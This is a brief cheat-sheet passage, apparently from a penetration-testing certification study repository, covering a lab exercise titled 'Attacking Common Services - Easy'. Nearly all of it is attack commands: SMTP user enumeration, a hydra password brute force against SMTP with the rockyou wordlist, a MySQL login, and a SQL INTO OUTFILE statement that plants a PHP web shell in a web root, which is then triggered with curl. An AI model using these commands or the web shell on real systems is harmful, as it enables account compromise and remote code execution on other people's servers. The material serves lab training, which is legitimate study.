https://github.com/missteek/cpts-quick-references/blob/main/assessments/Password%20Attacks%20Lab%20-%20Hard.md


#### Attacking Common Services - Easy:
```
smtp-user-enum -M RCPT -U users.txt -D inlanefreight.htb -t $ip
hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt $ip smtp
mysql -h $ip -u <user> -p <password>
curl http://$ip/cmd.php?cmd=whoami
SELECT "<?php if(isset($_GET['cmd'])){ echo '<pre>' . shell_exec($_GET['cmd']) . '</pre>'; } ?>" INTO OUTFILE 'C:/xampp/htdocs/cmd.php'; 
```
